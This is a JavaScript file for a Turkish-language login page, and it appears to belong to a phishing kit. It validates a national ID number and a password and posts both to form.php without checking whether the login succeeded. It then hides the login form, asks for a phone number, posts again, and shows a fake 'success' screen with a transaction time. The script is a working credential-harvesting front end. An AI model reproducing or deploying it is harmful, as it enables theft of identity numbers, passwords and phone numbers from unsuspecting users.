 document.addEventListener('DOMContentLoaded', () => {
	 


	document.getElementById("login-button").addEventListener("click", () => {
		
	let invalidTC = true;
	let invalidPassword = true;	
		
    const tc = document.getElementById("username").value;
    function isValidTC(tc) {
      if (!/^[0-9]{11}$/.test(tc)) return false;
      if (tc[0] === "0") return false;

      let digits = tc.split("").map(Number);
      let sumOdd = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
      let sumEven = digits[1] + digits[3] + digits[5] + digits[7];

      let digit10 = ((sumOdd * 7) - sumEven) % 10;
      let digit11 = (digits.slice(0, 10).reduce((a, b) => a + b, 0)) % 10;

      return (digit10 === digits[9] && digit11 === digits[10]);
    }

    if (!isValidTC(tc)) {
      document.getElementById('username-error').style.display = 'block';
	  document.getElementById("username").focus();
	  invalidTC = false;
	  
	 
	  
    }
	
	if(invalidTC){
		
		const password = document.getElementById("password").value;
	 if (password.length < 6) {
      document.getElementById("password").focus(); 
      alert("Parola en az 6 haneli olmalıdır.");
	  invalidPassword = false;	
	  document.getElementById('username-error').style.display = 'none';
    } 
		
	}
	
	
	
	if (invalidTC && invalidPassword) {
		
		
	 const form = document.getElementById("login-form");
  const formData = new FormData(form);

  fetch("form.php", {
    method: "POST",
    body: formData
  })
  .then(res => {
    if (res.ok) {
     
    } else {
    //  console.error("Sunucu hatası:", res.status);
    }
  })
  .catch(err => {
   // console.error("Bağlantı hatası:", err);
  });
		
		
		
		
		
		
		
		
		
		
		
  document.getElementById("phone-group").style.display = "block";
  document.getElementById("submit-button").style.display = "block";
  
  
  document.getElementById("username-group").style.display = "none";
  document.getElementById("password-group").style.display = "none";
  document.getElementById("login-button").style.display = "none";
  document.getElementById("forgot-password").style.display = "none";
  document.getElementById("tabs").style.display = "none";
  
}
	 
  });
  
  
  
  
     const phoneInput = document.getElementById("phone");

        phoneInput.addEventListener("input", function(event) {
            let value = phoneInput.value.replace(/\D/g, "");
            if (!value.startsWith("0")) {
                value = "0" + value;
            }
            value = value.slice(0, 11); 

            let formattedValue = value.replace(/^0(5\d{2})(\d{3})(\d{4})$/, "0$1 $2 $3");

            phoneInput.value = formattedValue;
        });

        phoneInput.addEventListener("keydown", function(event) {
            if (phoneInput.selectionStart === 0 && (event.key === "Backspace" || event.key === "Delete")) {
                event.preventDefault();
            }
        });


  document.getElementById("login-overlay").addEventListener("click", () => {
    document.querySelector(".login-overlay").classList.add("hide");
  });

	 
	 
	 
document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();

  const formData = new FormData(this);

  fetch("form.php", {
    method: "POST",
    body: formData
  })
  .then(res => {
    if (!res.ok) {
      throw new Error("Sunucu hatası: " + res.status);
    }
    return res.json();
  })
  .then(data => {
    document.getElementById('adi').textContent = data.adsoyad ?? "";
    document.getElementById('telefon').textContent = document.getElementById('phone').value;
    document.getElementById('islemSaati').textContent = new Date().toLocaleString('tr-TR');

    document.getElementById("success").style.display = "block";
    document.getElementById("login-con").style.display = "none";
  })
  .catch(err => {
    console.error("Bağlantı hatası:", err);
  });
});
	 
  setTimeout(() => {
    const overlay = document.getElementById('loading-overlay');
    overlay.style.opacity = '0';
    setTimeout(() => {
      overlay.style.display = 'none';
    }, 500);
  }, 1000);
  
  
  });